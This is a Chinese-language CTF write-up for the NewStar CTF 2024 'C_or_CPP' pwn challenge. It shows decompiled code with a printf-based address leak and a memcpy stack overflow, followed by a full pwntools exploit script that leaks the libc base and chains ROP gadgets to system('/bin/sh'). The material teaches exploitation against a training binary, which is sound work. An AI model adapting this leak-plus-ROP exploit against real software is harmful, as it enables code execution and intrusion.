---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# C_or_CPP

![运行程序](/assets/images/wp/2024/week5/c_or_cpp_1.png)

首先拖入 IDA 分析，这是一个用 C 和 CPP 来实现相同操作对比的程序

题目存在两个漏洞

一个是位于功能 2 里面的

```cpp
  printf("C String input: ");
  read(0, buf, 0x50uLL);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "C++ String: ");
  v5 = std::operator<<<char>(v4, v13);
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  printf("C String: %s\n", buf);
```

一个是位于功能 5 里面的

```cpp
  std::operator>><char>(&std::cin, v4);
  v2 = (const void *)std::string::c_str(v4);
  memcpy(dest, v2, 0x100uLL);
```

第一个漏洞首先 read 了 `0x50` 个字符，乍一看可能没有发现溢出，但结合上后面的 `printf("%s")`，即可实现泄露地址

<Container type='tip'>

`printf("%s")` 会一直输出直到遇到 `\x00`
</Container>

第二个漏洞先使用 `cin` 输入了字符串，再将它 memcpy 到 `dest` 字符串中，而 `dest` 是存放在栈上的，因此存在栈溢出

因为程序是使用 `g++` 编译的，相对可用的 gadget 会相当少，所以靠第一次泄露的地址，用 libc 的 gadget 来实现 ROP

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

k = 0
if k:
    addr = '127.0.0.1:9999'
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./C_or_CPP')
elf = ELF('./C_or_CPP')
libc = ELF('./libc.so.6')

def debug():
    gdb.attach(p, 'b *0x402F8F\nb *0x402A22\nc\n')

# debug()
sla(b'Please choose an option:', b'2')
sla(b'C++ String input:', b'inkey')
sa(b'C String input:', b'a' * 0x50)
ru(b'a' * 0x50)
libc_base = uu64(r(6)) - 0x4B1040
# libc_base = uu64(r(6)) - 0x4BB040
print(f"libc_base --> 0x{libc_base :x}")

rdi = libc_base + 0x000000000002A3E5  #: pop rdi; ret;
rsi = libc_base + 0x000000000016333A  #: pop rsi; ret;
rdx_rbx = libc_base + 0x00000000000904A9  #: pop rdx; pop rbx; ret;
bin_sh = libc_base + 0x001D8678
system = libc_base + libc.sym.system
# pause()

sla(b'Please choose an option:', b'5')
payload = b'a' * 0x48 + flat([rdi, bin_sh, rsi, 0, rdx_rbx, 0, 0, system])
sla(b'Try to say something:', payload)

p.interactive()
```
